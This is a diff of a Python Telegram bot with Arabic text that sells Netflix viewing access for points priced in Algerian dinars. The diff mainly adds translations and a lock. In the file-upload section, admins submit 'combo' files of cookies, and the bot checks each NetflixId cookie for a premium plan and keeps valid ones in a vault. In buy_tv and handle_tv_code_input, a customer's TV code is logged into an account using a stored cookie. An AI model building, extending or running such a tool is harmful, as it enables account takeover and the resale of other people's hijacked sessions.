+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🎬 {STORE_NAME}")
+
+
+async def buy_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    user = get_user(uid)
+    price = get_account_price()
+    if user.get("points", 0) < price:
+        await q.answer("❌", show_alert=True); return
+    if count_vault_cookies() == 0:
+        await q.answer("❌", show_alert=True); return
+    user_state[uid] = {"mode": "awaiting_tv_code"}
+    await q.edit_message_text(
+        t(uid, "tv_input"), parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+
+
+async def handle_tv_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if user_state.get(uid, {}).get("mode") != "awaiting_tv_code":
+        return
+    text = update.message.text.strip()
+    code = re.sub(r'\D', '', text)
+    if len(code) != 8:
+        await update.message.reply_text("❌ 8 " + ("أرقام" if get_user(uid).get("lang")=="ar" else "digits"))
+        return
+    user_state[uid]["mode"] = "idle"
+    user = get_user(uid)
+    price = get_account_price()
+    if user.get("points", 0) < price:
+        await update.message.reply_text(t(uid, "insufficient", points=user.get("points",0), price=price, need=price-user.get("points",0)), parse_mode="HTML")
+        return
+    if count_vault_cookies() == 0:
+        await update.message.reply_text(t(uid, "vault_empty"), parse_mode="HTML")
+        return
+    status = await update.message.reply_text(f"⏳ {code}")
+    stop_anim = asyncio.Event()
+    anim = asyncio.create_task(animate_message(context, update.effective_chat.id, status.message_id, stop_anim, t(uid, "processing")))
+    result = await asyncio.to_thread(process_tv_login, code)
+    stop_anim.set()
+    await asyncio.sleep(0.2)
+    try: anim.cancel()
+    except Exception: pass
+    with tv_stats_lock:
+        tv_stats["total_logins"] += 1
+    if result.get("success"):
+        with tv_stats_lock: tv_stats["successful"] += 1
+        new_balance = remove_points(uid, price)
+        user = get_user(uid)
+        user.setdefault("purchases", []).append({
+            "type": "tv", "code": code,
+            "country": result.get("country", "N/A"),
+            "plan": result.get("plan", "N/A"),
+            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        })
+        set_user(uid, user)
+        await status.edit_text(
+            t(uid, "tv_success", code=code, country=result.get("country","N/A"),
+              plan=result.get("plan","N/A"), balance=new_balance),
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+        market = get_market_price()
+        await notify_channel(context,
+            f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 المشتري: <code>{uid}</code>\n"
+            f"📦 الخدمة: حساب المشاهدة (📺 TV)\n"
+            f"🔢 العدد: 1\n"
+            f"💰 السعر: {market} د.جزائري\n"
+            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"🎬 {STORE_NAME}")
+    else:
+        with tv_stats_lock:
+            if result.get("error") == "no_cookies_left":
+                tv_stats["failed"] += 1
+            else:
+                tv_stats["codes_rejected"] += 1
+        await status.edit_text(
+            t(uid, "tv_failed", error=result.get("error", "unknown")),
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
 
 
 # ============================================================
@@ -1319,40 +1285,22 @@ async def my_purchases(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     uid = q.from_user.id
     await q.answer()
-
     user = get_user(uid)
     purchases = user.get("purchases", [])
-
     if not purchases:
-        await q.edit_message_text(
-            "📦 <b>مشترياتي</b>\n\nلا توجد مشتريات بعد.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-            ]))
+        await q.edit_message_text(t(uid, "no_purchases"), parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
         return
-
-    txt = f"📦 <b>مشترياتي ({len(purchases)})</b>\n\n"
+    items = ""
     for i, p in enumerate(purchases[-10:], 1):
         if p["type"] == "phone":
-            txt += (
-                f"{i}. 📱 هاتف\n"
-                f"   👤 {p.get('name','—')}\n"
-                f"   📅 {p.get('date','—')}\n\n"
-            )
+            items += f"{i}. 📱 {p.get('name','—')} — {p.get('date','—')}\n"
         else:
-            txt += (
-                f"{i}. 📺 TV\n"
-                f"   🔢 كود: <code>{p.get('code','—')}</code>\n"
-                f"   📅 {p.get('date','—')}\n\n"
-            )
-
-    txt += f"\n💰 رصيدك: <b>{user.get('points',0)}</b> نقطة"
-
-    await q.edit_message_text(txt, parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-        ]))
+            items += f"{i}. 📺 <code>{p.get('code','—')}</code> — {p.get('date','—')}\n"
+    await q.edit_message_text(
+        t(uid, "purchases_list", count=len(purchases), items=items, balance=user.get("points",0)),
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
 
 
 # ============================================================
@@ -1365,13 +1313,9 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
     await q.edit_message_text(
-        f"👑 <b>لوحة الأدمن</b>\n\n"
-        f"💰 السعر: <b>{get_account_price()}</b> نقطة\n"
-        f"💵 سعر السوق: <b>{get_market_price()}</b> د.ج\n"
-        f"📦 الخزنة: <b>{count_vault_cookies()}</b>\n"
-        f"💳 طلبات شحن: <b>{len(load_topups())}</b>",
-        parse_mode="HTML",
-        reply_markup=admin_markup())
+        t(uid, "admin_title", price=get_account_price(), market=get_market_price(),
+          vault=count_vault_cookies(), topups=len(load_topups())),
+        parse_mode="HTML", reply_markup=admin_markup(uid))
 
 
 async def admin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1381,14 +1325,8 @@ async def admin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_check"}
-    await q.edit_message_text(
-        "🔍 <b>فحص كومبو</b>\n\n"
-        "📤 ارفع ملف <code>.txt</code> / <code>.json</code> / <code>.zip</code>\n\n"
-        "⚙️ سيتم فحص بريميوم فقط وحفظهم بالخزنة.",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+    await q.edit_message_text(t(uid, "check_prompt"), parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1401,7 +1339,7 @@ async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for f in files:
         try: os.remove(os.path.join(COOKIES_DIR, f))
         except Exception: pass
-    await q.answer(f"🗑 حُذف {n}", show_alert=True)
+    await q.answer(f"🗑 {n}", show_alert=True)
     await admin_panel(update, context)
 
 
@@ -1412,14 +1350,9 @@ async def admin_set_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_set_price"}
-    await q.edit_message_text(
-        f"💵 <b>تغيير سعر الحساب</b>\n\n"
-        f"السعر الحالي: <b>{get_account_price()}</b> نقطة\n\n"
-        f"أرسل السعر الجديد (نقاط):",
+    await q.edit_message_text(t(uid, "price_prompt", current=get_account_price()),
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_set_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1429,14 +1362,9 @@ async def admin_set_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_set_market"}
-    await q.edit_message_text(
-        f"💰 <b>تغيير سعر السوق</b>\n\n"
-        f"السعر الحالي: <b>{get_market_price()}</b> د.ج\n\n"
-        f"أرسل السعر الجديد (دينار):",
+    await q.edit_message_text(t(uid, "market_prompt", current=get_market_price()),
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_add_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1446,14 +1374,8 @@ async def admin_add_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_add_points"}
-    await q.edit_message_text(
-        "➕ <b>إضافة نقاط</b>\n\n"
-        "أرسل: <code>user_id نقاط</code>\n"
-        "مثال: <code>123456789 15</code>",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+    await q.edit_message_text(t(uid, "addp_prompt"), parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_remove_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1463,52 +1385,30 @@ async def admin_remove_points(update: Update, context: ContextTypes.DEFAULT_TYPE
         await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_remove_points"}
-    await q.edit_message_text(
-        "➖ <b>خصم نقاط</b>\n\n"
-        "أرسل: <code>user_id نقاط</code>\n"
-        "مثال: <code>123456789 10</code>",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+    await q.edit_message_text(t(uid, "remp_prompt"), parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     uid = q.from_user.id
     if uid != OWNER_ID:
-        await q.answer("🚫 للمالك فقط", show_alert=True); return
+        await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_promote"}
-    await q.edit_message_text(
-        "👥 <b>رفع أدمن</b>\n\n"
-        "أرسل ID المستخدم:",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+    await q.edit_message_text(t(uid, "promote_prompt"), parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     uid = q.from_user.id
     if uid != OWNER_ID:
-        await q.answer("🚫 للمالك فقط", show_alert=True); return
+        await q.answer("🚫", show_alert=True); return
     await q.answer()
     user_state[uid] = {"mode": "admin_demote"}
-    if not dyn_admins:
-        await q.edit_message_text("لا يوجد أدمنز إضافيين.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-            ]))
-        return
-    await q.edit_message_text(
-        "📉 <b>تنزيل أدمن</b>\n\n"
-        "أرسل ID المستخدم:",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+    await q.edit_message_text(t(uid, "demote_prompt"), parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 async def admin_topups(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1517,29 +1417,21 @@ async def admin_topups(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(uid):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
-
     topups = load_topups()
     if not topups:
-        await q.edit_message_text(
-            "💳 <b>طلبات الشحن</b>\n\nلا توجد طلبات.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-            ]))
+        await q.edit_message_text(t(uid, "no_topups"), parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
         return
-
-    txt = f"💳 <b>طلبات الشحن ({len(topups)})</b>\n\n"
+    txt = f"💳 <b>{len(topups)}</b>\n\n"
     rows = []
     for u_id, data in list(topups.items())[:10]:
-        txt += (f"👤 <code>{u_id}</code>\n"
-                f"📅 {data['created_at']}\n\n")
+        txt += f"👤 <code>{u_id}</code> — {data['created_at']}\n"
         rows.append([
-            InlineKeyboardButton(f"✅ موافقة {u_id}", callback_data=f"apv_{u_id}"),
-            InlineKeyboardButton(f"❌ رفض {u_id}", callback_data=f"rej_{u_id}"),
+            InlineKeyboardButton(f"✅ {u_id}", callback_data=f"apv_{u_id}"),
+            InlineKeyboardButton(f"❌ {u_id}", callback_data=f"rej_{u_id}"),
         ])
-    rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
-    await q.edit_message_text(txt, parse_mode="HTML",
-                              reply_markup=InlineKeyboardMarkup(rows))
+    rows.append([InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")])
+    await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(rows))
 
 
 async def admin_approve_topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1547,32 +1439,20 @@ async def admin_approve_topup(update: Update, context: ContextTypes.DEFAULT_TYPE
     uid = q.from_user.id
     if not is_admin(uid):
         await q.answer("🚫", show_alert=True); return
-
     target = int(q.data.split("_", 1)[1])
     cfg = load_config()
     points = cfg.get("topup_points", TOPUP_POINTS)
-
     if approve_topup(target, points):
-        await q.answer(f"✅ تمت الموافقة (+{points})", show_alert=True)
-        # أشعر المستخدم
+        await q.answer(f"✅ +{points}", show_alert=True)
         try:
-            await context.bot.send_message(
-                target,
-                f"✅ <b>تمت الموافقة على طلبك</b>\n\n"
-                f"➕ +{points} نقطة\n"
-                f"💰 رصيدك: <b>{get_user_points(target)}</b>",
-                parse_mode="HTML"
-            )
+            await context.bot.send_message(target,
+                f"✅ +{points} points\n💰 {get_user_points(target)}",
+                parse_mode="HTML")
         except Exception:
             pass
-        # إشعار القناة
-        await notify_channel(context,
-            f"✅ <b>تمت الموافقة على شحن</b>\n"
-            f"👤 <code>{target}</code>\n"
-            f"➕ {points} نقطة")
+        await notify_channel(context, f"✅ شحن معتمد: <code>{target}</code> +{points}")
     else:
-        await q.answer("⚠️ الطلب غير موجود", show_alert=True)
-
+        await q.answer("⚠️", show_alert=True)
     await admin_topups(update, context)
 
 
@@ -1581,22 +1461,13 @@ async def admin_reject_topup(update: Update, context: ContextTypes.DEFAULT_TYPE)
     uid = q.from_user.id
     if not is_admin(uid):
         await q.answer("🚫", show_alert=True); return
-
     target = int(q.data.split("_", 1)[1])
     if reject_topup(target):
-        await q.answer("❌ رفض", show_alert=True)
+        await q.answer("❌", show_alert=True)
         try:
-            await context.bot.send_message(
-                target,
-                "❌ <b>تم رفض طلب الشحن</b>\n\n"
-                f"📞 تواصل: {TECH_USERNAME}",
-                parse_mode="HTML"
-            )
+            await context.bot.send_message(target, "❌", parse_mode="HTML")
         except Exception:
             pass
-    else:
-        await q.answer("⚠️ غير موجود", show_alert=True)
-
     await admin_topups(update, context)
 
 
@@ -1606,34 +1477,20 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(uid):
         await q.answer("🚫", show_alert=True); return
     await q.answer()
-
     users = load_users()
-    total_users = len(users)
     total_points = sum(u.get("points", 0) for u in users.values())
-    total_purchases = sum(len(u.get("purchases", [])) for u in users.values())
-    topups_count = len(load_topups())
-
+    total_purch = sum(len(u.get("purchases", [])) for u in users.values())
     with tv_stats_lock:
-        txt = (
-            f"📊 <b>إحصائيات شاملة</b>\n\n"
-            f"👥 <b>المستخدمين:</b> {total_users}\n"
-            f"💰 <b>مجموع النقاط:</b> {total_points}\n"
-            f"📦 <b>المشتريات:</b> {total_purchases}\n"
-            f"💳 <b>طلبات شحن معلقة:</b> {topups_count}\n"
-            f"📦 <b>الخزنة:</b> {count_vault_cookies()}\n\n"
-            f"🎬 <b>محاولات TV:</b> {tv_stats['total_logins']}\n"
-            f"✅ نجحت: {tv_stats['successful']}\n"
-            f"❌ فشلت: {tv_stats['failed']}\n"
-            f"🚫 أكواد خاطئة: {tv_stats['codes_rejected']}"
-        )
+        txt = (f"📊 <b>Stats</b>\n\n"
+               f"👥 {len(users)}\n💰 {total_points}\n📦 {total_purch}\n"
+               f"💳 {len(load_topups())}\n📦 {count_vault_cookies()}\n\n"
+               f"🎬 {tv_stats['total_logins']} | ✅ {tv_stats['successful']} | ❌ {tv_stats['failed']}")
     await q.edit_message_text(txt, parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
-        ]))
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
 
 
 # ============================================================
-# FILE UPLOAD (admin check)
+# FILE UPLOAD — Combo Check with LOCK
 # ============================================================
 async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.type != "private": return
@@ -1641,112 +1498,113 @@ async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(uid): return
     if user_state.get(uid, {}).get("mode") != "admin_check": return
 
-    file = await update.message.document.get_file()
-    ext = update.message.document.file_name.lower()
+    if user_locks[uid].locked():
+        await update.message.reply_text("⚠️ " + ("فحص جارٍ" if get_user(uid).get("lang")=="ar" else "Already checking"))
+        return
 
-    with tempfile.TemporaryDirectory() as td:
-        tp = os.path.join(td, update.message.document.file_name)
-        await file.download_to_drive(tp)
+    async with user_locks[uid]:
+        try:
+            file = await update.message.document.get_file()
+            ext = update.message.document.file_name.lower()
 
-        cookies = []
-        if ext.endswith('.zip'):
-            cookies = await extract_cookies_from_zip(tp)
-        else:
-            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
-                content = f.read()
-            c = parse_cookie_file(content)
-            for idx, (bn, cc) in enumerate(c):
-                if cc.get('NetflixId'):
-                    cookies.append((f"{safe_filename(update.message.document.file_name)}_{idx}", cc))
+            with tempfile.TemporaryDirectory() as td:
+                tp = os.path.join(td, update.message.document.file_name)
+                await file.download_to_drive(tp)
 
-        seen = set(); dedup = []
-        for nm, ck in cookies:
-            h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
-            if h not in seen:
-                seen.add(h); dedup.append((nm, ck))
-
-        if not dedup:
-            await update.message.reply_text("❌ لا كوكيز في الملف.")
-            return
-
-        status = await update.message.reply_text(
-            f"🔍 <b>جاري الفحص (بريم فقط)...</b>\n\n"
-            f"📥 {safe_filename(update.message.document.file_name)}\n"
-            f"🍪 {len(dedup)} كوكي",
-            parse_mode="HTML")
-
-        if uid not in user_executors:
-            user_executors[uid] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
-        executor = user_executors[uid]
-
-        premium = free = invalid = 0
-        total = len(dedup); checked = 0
-
-        for batch_start in range(0, total, BATCH_SIZE):
-            batch = dedup[batch_start:batch_start + BATCH_SIZE]
-            loop = asyncio.get_running_loop()
-            futures = [
-                asyncio.wait_for(
-                    loop.run_in_executor(executor, check_netflix_cookie, ck),
-                    timeout=35)
-                for nm, ck in batch
-            ]
-            results = await asyncio.gather(*futures, return_exceptions=True)
-
-            for i, result in enumerate(results):
-                checked += 1
-                nm, ck = batch[i]
-                if isinstance(result, Exception):
-                    invalid += 1; continue
-                if result.get("ok"):
-                    if result.get("premium"):
-                        if save_cookie_to_vault(nm, ck):
-                            premium += 1
-                    else:
-                        free += 1
+                cookies = []
+                if ext.endswith('.zip'):
+                    cookies = await extract_cookies_from_zip(tp)
                 else:
-                    invalid += 1
+                    with open(tp, "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+                    c = parse_cookie_file(content)
+                    for idx, (bn, cc) in enumerate(c):
+                        if cc.get('NetflixId'):
+                            cookies.append((f"{safe_filename(update.message.document.file_name)}_{idx}", cc))
 
-            try:
-                filled = min(20, checked * 20 // total) if total > 0 else 20
-                bar = '█' * filled + '░' * (20 - filled)
+                seen = set(); dedup = []
+                for nm, ck in cookies:
+                    h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
+                    if h not in seen:
+                        seen.add(h); dedup.append((nm, ck))
+
+                if not dedup:
+                    await update.message.reply_text("❌")
+                    return
+
+                status = await update.message.reply_text(
+                    f"🔍 {len(dedup)}", parse_mode="HTML")
+
+                if uid not in user_executors:
+                    user_executors[uid] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
+                executor = user_executors[uid]
+
+                premium = free = invalid = 0
+                total = len(dedup); checked = 0
+                start_time = time.time()
+
+                for batch_start in range(0, total, BATCH_SIZE):
+                    batch = dedup[batch_start:batch_start + BATCH_SIZE]
+                    loop = asyncio.get_running_loop()
+                    futures = [
+                        asyncio.wait_for(loop.run_in_executor(executor, check_netflix_cookie, ck), timeout=35)
+                        for nm, ck in batch
+                    ]
+                    results = await asyncio.gather(*futures, return_exceptions=True)
+
+                    for i, result in enumerate(results):
+                        checked += 1
+                        nm, ck = batch[i]
+                        if isinstance(result, Exception):
+                            invalid += 1; continue
+                        if result.get("ok"):
+                            if result.get("premium"):
+                                if save_cookie_to_vault(nm, ck):
+                                    premium += 1
+                            else:
+                                free += 1
+                        else:
+                            invalid += 1
+
+                    try:
+                        filled = min(20, checked * 20 // total) if total > 0 else 20
+                        bar = '█' * filled + '░' * (20 - filled)
+                        elapsed = time.time() - start_time
+                        speed = checked / elapsed if elapsed > 0 else 0
+                        eta = (total - checked) / speed if speed > 0 else 0
+                        await status.edit_text(
+                            f"🔍 <b>فحص</b>\n"
+                            f"<code>{bar}</code> {checked}/{total}\n"
+                            f"⚡ {speed:.1f}/s | ⏱️ {eta:.0f}s\n\n"
+                            f"🌟 {premium} | 🆓 {free} | ❌ {invalid}",
+                            parse_mode="HTML")
+                    except Exception:
+                        pass
+
+                user_state[uid]["mode"] = "idle"
                 await status.edit_text(
-                    f"🔍 <b>جاري الفحص...</b>\n\n"
-                    f"<code>{bar}</code> {checked}/{total}\n\n"
-                    f"🌟 بريم: {premium}\n"
-                    f"🆓 مجاني: {free}\n"
-                    f"❌ فاسد: {invalid}",
-                    parse_mode="HTML")
-            except Exception:
-                pass
+                    f"✅ <b>اكتمل</b>\n\n"
+                    f"📥 {total}\n🌟 {premium}\n🆓 {free}\n❌ {invalid}\n"
+                    f"⚡ {time.time()-start_time:.1f}s\n"
+                    f"📦 {count_vault_cookies()}",
+                    parse_mode="HTML",
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "admin"), callback_data="admin_panel")]]))
 
-        user_state[uid]["mode"] = "idle"
-
-        await status.edit_text(
-            f"✅ <b>اكتمل</b>\n\n"
-            f"📥 فُحص: {total}\n"
-            f"🌟 محفوظ: {premium}\n"
-            f"🆓 تجاهل: {free}\n"
-            f"❌ فاسد: {invalid}\n"
-            f"📦 الخزنة: {count_vault_cookies()}",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("👑 لوحة الأدمن", callback_data="admin_panel")]
-            ]))
+        except Exception as e:
+            log.exception("combo failed")
+            await update.message.reply_text(f"❌ {str(e)[:100]}")
 
 
 # ============================================================
-# TEXT HANDLER (admin inputs)
+# TEXT HANDLER
 # ============================================================
 async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     mode = user_state.get(uid, {}).get("mode", "idle")
     text = update.message.text.strip()
 
-    # TV code input (user)
     if mode == "awaiting_tv_code":
-        await handle_tv_code_input(update, context)
-        return
+        await handle_tv_code_input(update, context); return
 
     if not is_admin(uid):
         return
@@ -1757,12 +1615,10 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if p < 1: raise ValueError
             set_account_price(p)
             user_state[uid]["mode"] = "idle"
-            await update.message.reply_text(f"✅ السعر الآن: {p} نقطة")
-            await notify_channel(context,
-                f"💵 <b>تحديث السعر</b>\n"
-                f"🏷️ السعر الجديد: <b>{p}</b> نقطة")
+            await update.message.reply_text(f"✅ {p}")
+            await notify_channel(context, f"💵 <b>السعر الجديد:</b> {p} نقطة")
         except Exception:
-            await update.message.reply_text("❌ رقم غير صالح")
+            await update.message.reply_text(t(uid, "invalid_number"))
         return
 
     if mode == "admin_set_market":
@@ -1771,95 +1627,69 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if p < 1: raise ValueError
             set_market_price(p)
             user_state[uid]["mode"] = "idle"
-            await update.message.reply_text(f"✅ سعر السوق الآن: {p} د.ج")
+            await update.message.reply_text(f"✅ {p} د.ج")
         except Exception:
-            await update.message.reply_text("❌ رقم غير صالح")
+            await update.message.reply_text(t(uid, "invalid_number"))
         return
 
     if mode == "admin_add_points":
         try:
             parts = text.split()
-            target = int(parts[0])
-            amount = int(parts[1])
+            target = int(parts[0]); amount = int(parts[1])
             new_balance = add_points(target, amount)
             user_state[uid]["mode"] = "idle"
             await update.message.reply_text(
-                f"✅ تم إضافة {amount} نقطة لـ {target}\n"
-                f"💰 الرصيد الجديد: {new_balance}")
-            try:
-                await context.bot.send_message(
-                    target,
-                    f"➕ <b>تمت إضافة نقاط</b>\n\n"
-                    f"+{amount} نقطة\n"
-                    f"💰 رصيدك: {new_balance}",
-                    parse_mode="HTML")
-            except Exception:
-                pass
-            await notify_channel(context,
-                f"➕ <b>إضافة نقاط</b>\n"
-                f"👤 {target}\n"
-                f"➕ {amount} نقطة\n"
-                f"💰 {new_balance}")
-        except Exception:
-            await update.message.reply_text(
-                "❌ صيغة خاطئة. مثال: <code>123456789 15</code>",
+                t(uid, "added_points", amount=amount, uid=target, balance=new_balance),
                 parse_mode="HTML")
+            try:
+                await context.bot.send_message(target,
+                    f"➕ +{amount}\n💰 {new_balance}", parse_mode="HTML")
+            except Exception: pass
+            await notify_channel(context, f"➕ <code>{target}</code> +{amount} = {new_balance}")
+        except Exception:
+            await update.message.reply_text(t(uid, "invalid_format"))
         return
 
     if mode == "admin_remove_points":
         try:
             parts = text.split()
-            target = int(parts[0])
-            amount = int(parts[1])
+            target = int(parts[0]); amount = int(parts[1])
             new_balance = remove_points(target, amount)
             user_state[uid]["mode"] = "idle"
             await update.message.reply_text(
-                f"✅ تم خصم {amount} نقطة من {target}\n"
-                f"💰 الرصيد: {new_balance}")
-        except Exception:
-            await update.message.reply_text(
-                "❌ صيغة خاطئة. مثال: <code>123456789 10</code>",
+                t(uid, "removed_points", amount=amount, uid=target, balance=new_balance),
                 parse_mode="HTML")
+        except Exception:
+            await update.message.reply_text(t(uid, "invalid_format"))
         return
 
     if mode == "admin_promote":
         try:
             target = int(text)
             if target in dyn_admins or target == OWNER_ID:
-                await update.message.reply_text("⚠️ موجود مسبقاً")
-                return
+                await update.message.reply_text(t(uid, "already_pending")); return
             dyn_admins.append(target)
             save_dyn_admins(dyn_admins)
             user_state[uid]["mode"] = "idle"
-            await update.message.reply_text(f"✅ تم رفع الأدمن: {target}")
+            await update.message.reply_text(t(uid, "promoted", uid=target), parse_mode="HTML")
             try:
-                await context.bot.send_message(target,
-                    "🎉 <b>مبروك!</b>\nتم ترقيتك إلى أدمن.",
-                    parse_mode="HTML")
-            except Exception:
-                pass
+                await context.bot.send_message(target, "🎉", parse_mode="HTML")
+            except Exception: pass
         except Exception:
-            await update.message.reply_text("❌ رقم غير صالح")
+            await update.message.reply_text(t(uid, "invalid_number"))
         return
 
     if mode == "admin_demote":
         try:
             target = int(text)
             if target not in dyn_admins:
-                await update.message.reply_text("⚠️ مو أدمن")
-                return
+                await update.message.reply_text(t(uid, "not_admin")); return
             dyn_admins.remove(target)
             save_dyn_admins(dyn_admins)
             user_state[uid]["mode"] = "idle"
-            await update.message.reply_text(f"✅ تم تنزيل الأدمن: {target}")
-            try:
-                await context.bot.send_message(target,
-                    "⚠️ <b>تم تنزيلك من الأدمن</b>",
-                    parse_mode="HTML")
-            except Exception:
-                pass
+            await update.message.reply_text(t(uid, "demoted", uid=target), parse_mode="HTML")
         except Exception:
-            await update.message.reply_text("❌ رقم غير صالح")
+            await update.message.reply_text(t(uid, "invalid_number"))
         return
 
 
@@ -1869,6 +1699,23 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     data = q.data
+    uid = q.from_user.id
+
+    if data.startswith("setlang_"):
+        lang = data.replace("setlang_", "")
+        user = get_user(uid)
+        user["lang"] = lang
+        set_user(uid, user)
+        await q.answer(f"✅ {LANGS[lang]['name']}")
+        await back_home(update, context)
+        return
+
+    if data == "change_lang":
+        await q.answer()
+        await q.edit_message_text(
+            TEXTS[get_user(uid).get("lang", "ar")]["choose_lang"],
+            parse_mode="HTML", reply_markup=lang_markup())
